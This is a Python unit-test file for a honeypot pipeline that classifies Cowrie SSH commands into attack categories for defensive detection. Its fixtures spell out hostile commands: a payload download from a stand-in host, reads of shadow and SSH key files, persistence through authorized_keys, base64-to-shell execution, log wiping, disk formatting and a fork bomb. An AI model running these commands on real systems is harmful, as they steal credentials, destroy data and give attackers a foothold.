from __future__ import annotations

import unittest

from honeypot_pipeline.classification import classify_event
from honeypot_pipeline.cowrie import normalize_cowrie_event
from honeypot_pipeline.records import build_event_record


def _make_command_event(command: str) -> dict:
    """Helper: normalize a cowrie.command.input event with the given command."""
    return normalize_cowrie_event(
        {
            "eventid": "cowrie.command.input",
            "protocol": "ssh",
            "src_ip": "198.51.100.42",
            "input": command,
        }
    )


def _make_lifecycle_event(eventid: str) -> dict:
    """Helper: normalize a non-command Cowrie lifecycle/metadata event."""
    return normalize_cowrie_event(
        {
            "eventid": eventid,
            "protocol": "ssh",
            "src_ip": "192.168.1.32",
        }
    )


class ClassificationTests(unittest.TestCase):
    # ── Existing categories (regression) ──────────────────────────────

    def test_classifies_login_activity_as_brute_force(self) -> None:
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.login.failed",
                "protocol": "ssh",
                "src_ip": "203.0.113.10",
            }
        )
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "brute_force")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_download_commands_as_malware_download(self) -> None:
        event = _make_command_event("wget http://bad.example.com/payload.sh")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "malware_download")
        self.assertEqual(classification["severity"], "high")

    def test_reconnaissance_detected(self) -> None:
        event = _make_command_event("whoami")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "reconnaissance")

    def test_persistence_detected(self) -> None:
        event = _make_command_event("echo 'key' >> ~/.ssh/authorized_keys")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "persistence")

    # ── New category: privilege_escalation ────────────────────────────

    def test_classifies_sudo_l_as_privilege_escalation(self) -> None:
        event = _make_command_event("sudo -l")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_suid_search_as_privilege_escalation(self) -> None:
        event = _make_command_event("find / -perm -4000 -type f 2>/dev/null")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    def test_classifies_sudoers_reading_as_privilege_escalation(self) -> None:
        event = _make_command_event("cat /etc/sudoers")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    def test_classifies_getcap_as_privilege_escalation(self) -> None:
        event = _make_command_event("getcap -r / 2>/dev/null")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    # ── New category: credential_access ───────────────────────────────

    def test_classifies_shadow_read_as_credential_access(self) -> None:
        event = _make_command_event("cat /etc/shadow")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_id_rsa_read_as_credential_access(self) -> None:
        event = _make_command_event("cat ~/.ssh/id_rsa")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")

    def test_classifies_bash_history_scraping_as_credential_access(self) -> None:
        event = _make_command_event("cat ~/.bash_history | tail -20")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")

    def test_classifies_grep_password_as_credential_access(self) -> None:
        event = _make_command_event("grep -r password /etc/ 2>/dev/null")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "credential_access")

    # ── New category: cryptomining ────────────────────────────────────

    def test_classifies_xmrig_as_cryptomining(self) -> None:
        event = _make_command_event("/tmp/xmrig --url=pool.example.com:4444 --user=x --pass=x")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_stratum_pool_as_cryptomining(self) -> None:
        event = _make_command_event("./minerd -o stratum+tcp://pool.example.com:3333 -u wallet -p x")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")

    def test_classifies_cryptonight_algo_as_cryptomining(self) -> None:
        event = _make_command_event("./cpuminer --algo=cryptonight --url=pool.example.com:5555")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "cryptomining")

    # ── New category: obfuscation ─────────────────────────────────────

    def test_classifies_base64_decode_as_obfuscation(self) -> None:
        event = _make_command_event("echo 'd2hvYW1p' | base64 -d")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "obfuscation")
        self.assertEqual(classification["severity"], "medium")

    def test_classifies_eval_as_obfuscation(self) -> None:
        event = _make_command_event("eval $(echo 'aWQK' | base64 -d)")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "obfuscation")

    def test_classifies_sh_c_as_obfuscation(self) -> None:
        event = _make_command_event("sh -c 'echo dW5hbWUgLWEK | base64 -d | sh'")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "obfuscation")

    # ── New category: defense_evasion ─────────────────────────────────

    def test_classifies_log_clearing_as_defense_evasion(self) -> None:
        event = _make_command_event("truncate -s 0 /var/log/syslog")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_history_clearing_as_defense_evasion(self) -> None:
        event = _make_command_event("history -c")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    def test_classifies_unset_histfile_as_defense_evasion(self) -> None:
        event = _make_command_event("unset HISTFILE")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    def test_classifies_truncate_log_as_defense_evasion(self) -> None:
        event = _make_command_event("truncate -s 0 /var/log/syslog")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "defense_evasion")

    # ── New category: destructive_action ──────────────────────────────

    def test_classifies_rm_rf_as_destructive(self) -> None:
        event = _make_command_event("rm -rf /var/log/*")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")
        self.assertEqual(classification["severity"], "high")

    def test_classifies_mkfs_as_destructive(self) -> None:
        event = _make_command_event("mkfs.ext4 /dev/sda1")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    def test_classifies_dd_zero_as_destructive(self) -> None:
        event = _make_command_event("dd if=/dev/zero of=/tmp/.wipe bs=1M count=10")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    def test_classifies_fork_bomb_as_destructive(self) -> None:
        event = _make_command_event(":(){ :|:& };:")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    # ── Precedence tests ──────────────────────────────────────────────

    def test_destructive_beats_generic_command_execution(self) -> None:
        """High-confidence specific categories must beat the generic fallback."""
        event = _make_command_event("rm -rf /tmp/*")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "destructive_action")

    def test_cryptomining_beats_command_execution(self) -> None:
        event = _make_command_event("/tmp/xmrig --donate-level=1")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "cryptomining")

    def test_privilege_escalation_beats_command_execution(self) -> None:
        event = _make_command_event("sudo -l 2>/dev/null")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "privilege_escalation")

    def test_credential_access_beats_command_execution(self) -> None:
        event = _make_command_event("cat /etc/shadow 2>/dev/null | head -5")
        classification = classify_event(event)
        self.assertNotEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["attack_category"], "credential_access")

    def test_destructive_beats_defense_evasion_for_rm_rf_var_log(self) -> None:
        """rm -rf /var/log/* should be destructive_action, not defense_evasion."""
        event = _make_command_event("rm -rf /var/log/*")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "destructive_action")

    # ── Session / connection lifecycle events (no command) ────────────

    def test_session_connect_is_connection(self) -> None:
        event = _make_lifecycle_event("cowrie.session.connect")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "connection")
        self.assertEqual(classification["severity"], "low")

    def test_direct_tcpip_request_is_connection_medium(self) -> None:
        event = _make_lifecycle_event("cowrie.direct-tcpip.request")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "connection")
        self.assertEqual(classification["severity"], "medium")

    def test_session_closed_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.session.closed")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")
        self.assertEqual(classification["severity"], "low")

    def test_session_params_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.session.params")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_log_closed_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.log.closed")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_client_var_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.client.var")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_client_version_is_session(self) -> None:
        event = _make_lifecycle_event("cowrie.client.version")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "session")

    def test_login_still_beats_session_mapping(self) -> None:
        """A login event carries 'session'-like data but must stay brute_force."""
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.login.failed",
                "protocol": "ssh",
                "src_ip": "203.0.113.10",
                "session": "abc123",
            }
        )
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "brute_force")

    def test_command_input_not_treated_as_session(self) -> None:
        """A command.input event with a command must classify on the command."""
        event = _make_command_event("ls -la")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "command_execution")

    def test_truly_unknown_event_stays_unknown(self) -> None:
        event = _make_lifecycle_event("cowrie.something.weird")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "unknown")

    # ── Regression: existing categories still work ────────────────────

    def test_build_record_includes_indicators_and_classification(self) -> None:
        event = normalize_cowrie_event(
            {
                "eventid": "cowrie.command.input",
                "protocol": "ssh",
                "src_ip": "198.51.100.24",
                "input": "whoami",
            }
        )
        record = build_event_record(event)
        self.assertEqual(record["indicators"]["ip_addresses"], ["198.51.100.24"])
        self.assertEqual(record["classification"]["attack_category"], "reconnaissance")
        self.assertEqual(record["risk"]["level"], "low")

    def test_unrecognized_command_falls_back_to_command_execution(self) -> None:
        event = _make_command_event("echo hello world")
        classification = classify_event(event)
        self.assertEqual(classification["attack_category"], "command_execution")
        self.assertEqual(classification["severity"], "medium")


if __name__ == "__main__":
    unittest.main()
